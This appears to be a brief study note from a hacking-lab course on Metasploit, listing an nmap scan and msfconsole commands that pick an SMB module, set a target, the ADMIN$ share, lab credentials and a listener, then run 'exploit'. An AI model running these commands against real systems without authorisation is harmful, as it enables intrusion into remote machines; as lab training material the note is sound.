# Basic Information
`Metasploit` was made by Rapid7

Using the `msfconsole -q` will launch it quietly.

### Starting off
Using an nmap scan get the information
`nmap -sC -sV -Pn 10.10.10.10`
In this scenario we found SMB
Now running the `msfconsole -q`
```metasploit
search smb
use 56 (This is the number of the payout)
options (Fill out what is needed whether it is the IP address or the other things)
set RHOSTS 10.10.10.10
set SHARE ADMIN$
set SMBpass HTB_@cademy_stdnt!
set SMBUser htb-student
set LHOST 10.10.10.10
exploit
```
